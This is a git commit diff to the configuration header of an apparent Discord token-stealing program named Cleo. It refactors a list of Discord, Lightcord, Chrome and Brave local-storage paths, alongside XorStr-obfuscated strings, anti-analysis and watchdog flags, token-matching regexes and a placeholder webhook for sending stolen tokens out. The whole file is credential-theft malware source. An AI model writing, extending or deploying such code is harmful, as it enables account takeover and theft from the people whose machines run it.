c3e6ef5f2177bd06f1c8f1c7e75f862b3bc53bf2
Passive <40716556+Passive@users.noreply.github.com>
2022-01-25 14:22:53 +1300

    Small code update

--- Cleo/config.h
+++ Cleo/config.h
@@ -8,26 +8,17 @@ namespace Config {
 	bool check_analyzing = true;
 	bool watch_dog = true;
 	
-	const char* webhook = XorStr("your webhook here");
+	const char* webhook = XorStr("webhook here");
 	
 	std::regex token_nonmfa(XorStr(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
 	std::regex token_mfa(XorStr(R"(mfa\.[\w-]{84})"));
-  //TODO: fix this
-	const char* LIGHTCORD	=	XorStr("\\Lightcord\\Local Storage\\leveldb");
-	const char* DISCORD		=	XorStr("\\Discord\\Local Storage\\leveldb");
-	const char* DISCORDPTB	=	XorStr("\\discordptb\\Local Storage\\leveldb");
-	const char* CANARY		=	XorStr("\\discordcanary\\Local Storage\\leveldb");
 
-	const char* CHROME		=	XorStr("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
-	const char* BRAVE		=	XorStr("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
-
-	std::vector<std::string> installs {
-		LIGHTCORD,
-		DISCORD,
-		DISCORDPTB,
-		CANARY,
-		CHROME,
-		BRAVE
+	char* installs[] = {
+		XorStr("\\Lightcord\\Local Storage\\leveldb"),
+		XorStr("\\Discord\\Local Storage\\leveldb"),
+		XorStr("\\discordptb\\Local Storage\\leveldb"),
+		XorStr("\\discordcanary\\Local Storage\\leveldb"),
+		XorStr("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
+		XorStr("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb")
 	};
-
 }
